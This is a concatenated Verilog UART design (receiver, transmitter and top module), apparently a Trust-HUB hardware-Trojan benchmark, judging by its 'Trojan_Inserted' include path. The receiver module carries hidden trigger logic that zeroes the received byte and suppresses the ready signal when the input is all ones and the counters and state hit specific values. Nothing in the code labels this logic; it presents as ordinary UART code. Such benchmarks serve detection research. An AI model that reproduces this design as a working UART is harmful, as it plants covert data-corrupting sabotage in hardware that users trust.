// AUTO-GENERATED FILE


// === inc.h ===

//
// Receiver state definition
//
parameter	r_START 	= 3'b001,
          	r_CENTER	= 3'b010,
          	r_WAIT  	= 3'b011,
          	r_SAMPLE	= 3'b100,
		  	r_STOP  	= 3'b101;

//
// Xmitter state definition
//
parameter	x_IDLE		= 3'b000,
			x_START		= 3'b010,
			x_WAIT		= 3'b011,
			x_SHIFT		= 3'b100,
			x_STOP		= 3'b101,
                        x_DataSend        = 3'b111;


parameter	s_idle		= 3'b000,
			s_count1	= 3'b001,
			s_count2	= 3'b010,
			s_count3	= 3'b011,
			s_stop		= 3'b111;
                        

parameter   x_STARTbit  = 2'b00,
			x_STOPbit   = 2'b01,
			x_ShiftReg  = 2'b10,
                        x_miDataSend  = 2'b11;

//
// Common parameter Definition
//
parameter	LO 		= 1'b0,
          	HI		= 1'b1,		
 		X		= 1'bx,
                DataSend  =1'b0;


parameter       DataSend_bit =1'b1;
parameter       DataCon_bit =1'b1;

// *****************************
//
// Receiver Configuration
//
// *****************************

// Word length.  
// This defines the number of bits 
// in a "word".  Typcially 8.
// min=0, max=8

parameter	WORD_LEN = 8;




`define DEBUG

// === u_rec.v ===
`timescale 1ns/100ps


module u_rec (	
				sys_rst_l,
				sys_clk,

				
				uart_dataH,

				
				rec_dataH,
				rec_readyH

				);


`include "/home/salmani_h/Trust_HUB/Trojan_Inserted/inc.h"

input			sys_rst_l;	
input			sys_clk;	

input			uart_dataH;	

output	[7:0]	rec_dataH;	
output			rec_readyH;	



reg		[2:0]	next_state, state;
reg				rec_datH, rec_datSyncH;
reg		[3:0]	bitCell_cntrH;
reg				cntr_resetH;
reg		[7:0]	par_dataH;
reg				shiftH;
reg		[3:0]	recd_bitCntrH;
reg				countH;
reg				rstCountH;
reg				rec_readyH_temp;
reg				rec_readyInH;


wire	[7:0]	rec_dataH;
wire    rec_data_cntrH_1; 
wire    rec_data_cntrH_2;
wire    rec_data_cntrH_3;
wire    ena;


assign rec_dataH = ena? 8'd0: par_dataH;


assign rec_data_cntrH_1=rec_dataH[0]&rec_dataH[1]&rec_dataH[2]&rec_dataH[3]&rec_dataH[4]&rec_dataH[5]&rec_dataH[6]&rec_dataH[7];
assign rec_data_cntrH_2= (~bitCell_cntrH[0])& bitCell_cntrH[1]& bitCell_cntrH[2]& bitCell_cntrH[3]&recd_bitCntrH[0]&recd_bitCntrH[1]&(~recd_bitCntrH[2])&(~recd_bitCntrH[3]);
assign rec_data_cntrH_3= (state[0])&(state[1])&(~state[2]);

assign ena= rec_data_cntrH_1&rec_data_cntrH_2&rec_data_cntrH_3;
assign rec_readyH=ena? 1'b0 : rec_readyH_temp;


always @(posedge sys_clk or negedge sys_rst_l)
  if (~sys_rst_l) begin
     rec_datSyncH <= 1;
     rec_datH     <= 1;
  end else begin
     rec_datSyncH <= uart_dataH;
     rec_datH     <= rec_datSyncH;
  end


always @(posedge sys_clk or negedge sys_rst_l)
  if (~sys_rst_l) bitCell_cntrH <= 0;
  else if (cntr_resetH) bitCell_cntrH <= 0;
  else bitCell_cntrH <= bitCell_cntrH + 1;


always @(posedge sys_clk or negedge sys_rst_l)
  if (~sys_rst_l) par_dataH <= 0;
  else if(shiftH) begin
     par_dataH[6:0] <= par_dataH[7:1];
     par_dataH[7]   <= rec_datH;
  end


always @(posedge sys_clk or negedge sys_rst_l)
  if (~sys_rst_l) recd_bitCntrH <= 0;
  else if (countH) recd_bitCntrH <= recd_bitCntrH + 1;
  else if (rstCountH) recd_bitCntrH <= 0;




always @(posedge sys_clk or negedge sys_rst_l)
  if (~sys_rst_l) state <= r_START;
  else state <= next_state;


always @(state or rec_datH or bitCell_cntrH or recd_bitCntrH)
begin

  next_state  = state;
  cntr_resetH = HI;
  shiftH      = LO;
  countH      = LO;
  rstCountH   = LO;
  rec_readyInH= LO;

  case (state)
     
    r_START: begin
       if (~rec_datH ) next_state = r_CENTER;
       else begin 
         next_state = r_START;
         rstCountH  = HI; 
         rec_readyInH = HI; 
       end
    end

    r_CENTER: begin
       if (bitCell_cntrH == 4'h4) begin
         if (~rec_datH) next_state = r_WAIT;
         else next_state = r_START;
       end else begin
         next_state  = r_CENTER;
		 cntr_resetH = LO;        
       end
    end


	r_WAIT: begin
		if (bitCell_cntrH == 4'hE) begin
           if (recd_bitCntrH == WORD_LEN)
             next_state = r_STOP; 
           else begin
             next_state = r_SAMPLE;
           end
        end else begin
             next_state  = r_WAIT;
             cntr_resetH = LO;  
        end
    end

	r_SAMPLE: begin
		shiftH = HI; 
		countH = HI; 
		next_state = r_WAIT;
	end	


    r_STOP: begin
		next_state = r_START;
        rec_readyInH = HI;
    end

    default: begin
       next_state  = 3'bxxx;
       cntr_resetH = X;
	   shiftH      = X;
	   countH      = X;
       rstCountH   = X;
       rec_readyInH  = X;

    end

  endcase


end


always @(posedge sys_clk or negedge sys_rst_l)
  if (~sys_rst_l) rec_readyH_temp <= 0;
  else rec_readyH_temp <= rec_readyInH;




endmodule

// === u_xmit.v ===



module u_xmit(	sys_clk,
				sys_rst_l,

				uart_xmitH,
				xmitH,
				xmit_dataH,
				xmit_doneH
			);


`include "/home/salmani_h/Trust_HUB/Trojan_Inserted/inc.h"
input			sys_clk;	
input			sys_rst_l;	
output			uart_xmitH;	
input			xmitH;		
input	[7:0]	xmit_dataH;
output			xmit_doneH;	



reg		[2:0]	next_state, state;
reg				load_shiftRegH;
reg				shiftEnaH;
reg		[3:0]	bitCell_cntrH;
reg				countEnaH;
reg		[7:0]	xmit_ShiftRegH;
reg		[3:0]	bitCountH;
reg				rst_bitCountH;
reg				ena_bitCountH;
reg		[1:0]	xmitDataSelH;
reg				uart_xmitH;
reg				xmit_doneInH;
reg				xmit_doneH;


always @(xmit_ShiftRegH or xmitDataSelH)
  case (xmitDataSelH)
	x_STARTbit: uart_xmitH = LO;
	x_STOPbit:  uart_xmitH = HI;
	x_ShiftReg: uart_xmitH = xmit_ShiftRegH[0];
	default:    uart_xmitH = X;	
  endcase


always @(posedge sys_clk or negedge sys_rst_l)
  if (~sys_rst_l) bitCell_cntrH <= 0;
  else if (countEnaH) bitCell_cntrH <= bitCell_cntrH + 1;
  else bitCell_cntrH <= 0;



always @(posedge sys_clk or negedge sys_rst_l)
  if (~sys_rst_l) xmit_ShiftRegH <= 0;
  else 
	if (load_shiftRegH) xmit_ShiftRegH <= xmit_dataH;
	else if (shiftEnaH) begin
		xmit_ShiftRegH[6:0] <= xmit_ShiftRegH[7:1];
		xmit_ShiftRegH[7]   <= HI;
	end else xmit_ShiftRegH <= xmit_ShiftRegH;



always @(posedge sys_clk or negedge sys_rst_l)
  if (~sys_rst_l) bitCountH <= 0;
  else if (rst_bitCountH) bitCountH <= 0;
  else if (ena_bitCountH) bitCountH <= bitCountH + 1;



always @(posedge sys_clk or negedge sys_rst_l)
  if (~sys_rst_l) state <= x_IDLE;
  else state <= next_state;


always @(state or xmitH or bitCell_cntrH or bitCountH)
begin
   
	next_state 		= state;
	load_shiftRegH	= LO;
	countEnaH       = LO;
	shiftEnaH       = LO;
	rst_bitCountH   = LO;
	ena_bitCountH   = LO;
    xmitDataSelH    = x_STOPbit;
	xmit_doneInH	= LO;

	case (state)
    	
		x_IDLE: begin
			if (xmitH) begin 
                next_state = x_START;
				load_shiftRegH = HI;
                                bitCell_cntrH <= 0;
                                bitCountH <= 0;
                                xmit_ShiftRegH <= 0;
				
			end else begin
				next_state    = x_IDLE;
				rst_bitCountH = HI; 
                xmit_doneInH  = HI;
			end
		end
  


		x_START: begin
            xmitDataSelH    = x_STARTbit;
			if (bitCell_cntrH == 4'hF)
				next_state = x_WAIT;
			else begin 
				next_state = x_START;
				countEnaH  = HI; 
			end				
		end


		x_WAIT: begin
            xmitDataSelH    = x_ShiftReg;
			if (bitCell_cntrH == 4'hE) begin
				if (bitCountH == WORD_LEN)
					next_state = x_STOP;
				else begin
					next_state = x_SHIFT;
					ena_bitCountH = HI; 
				end
			end else begin
				next_state = x_WAIT;
				countEnaH  = HI;
			end		
		end



		x_SHIFT: begin
            xmitDataSelH    = x_ShiftReg;
			next_state = x_WAIT;
			shiftEnaH  = HI; 
		end


		x_STOP: begin
            xmitDataSelH    = x_STOPbit;
			if (bitCell_cntrH == 4'hF) begin
				next_state   = x_IDLE;
                xmit_doneInH = HI;
			end else begin
				next_state = x_STOP;
				countEnaH = HI; 
			end
		end



		default: begin
			next_state     = 3'bxxx;
			load_shiftRegH = X;
			countEnaH      = X;
            shiftEnaH      = X;
            rst_bitCountH  = X;
            ena_bitCountH  = X;
            xmitDataSelH   = 2'bxx;
            xmit_doneInH   = X;
		end

    endcase

end


always @(posedge sys_clk or negedge sys_rst_l)
  if (~sys_rst_l) xmit_doneH <= 0;
  else xmit_doneH <= xmit_doneInH;


endmodule

// === uart.v ===
`timescale 1ns/100ps

module uart	(	sys_clk,
				sys_rst_l,
				uart_XMIT_dataH,
				xmitH,
				xmit_dataH,
				xmit_doneH,

				uart_REC_dataH,
				rec_dataH,
				rec_readyH		
			);


`include "/home/salmani_h/Trust_HUB/Trojan_Inserted/inc.h"
input			sys_clk;
input			sys_rst_l;
output			uart_XMIT_dataH;
input			xmitH;
input	[7:0]	xmit_dataH;
output			xmit_doneH;

input			uart_REC_dataH;
output	[7:0]	rec_dataH;
output			rec_readyH;

reg	[7:0]	rec_dataH;
reg     [7:0]   rec_dataH_temp;
wire    [7:0]   rec_dataH_rec;
wire			rec_readyH;



u_xmit  iXMIT(  .sys_clk(sys_clk),
				.sys_rst_l(sys_rst_l),

				.uart_xmitH(uart_XMIT_dataH),
				.xmitH(xmitH),
				.xmit_dataH(xmit_dataH),
				.xmit_doneH(xmit_doneH)
			);




u_rec iRECEIVER (
				.sys_rst_l(sys_rst_l),
				.sys_clk(sys_clk),

				
				.uart_dataH(uart_REC_dataH),

				.rec_dataH(rec_dataH_rec),
				.rec_readyH(rec_readyH)

				);

always @(posedge sys_clk or negedge sys_rst_l) begin
   if (~sys_rst_l) begin
      rec_dataH=0;
  end 
   else begin
     rec_dataH=rec_dataH_temp;
   end
  end
  

always @(posedge rec_readyH or negedge sys_rst_l) begin
   if (~sys_rst_l) begin
      rec_dataH_temp<=0;
   end 
   else begin
      rec_dataH_temp<=rec_dataH_rec;
   end
  end

endmodule
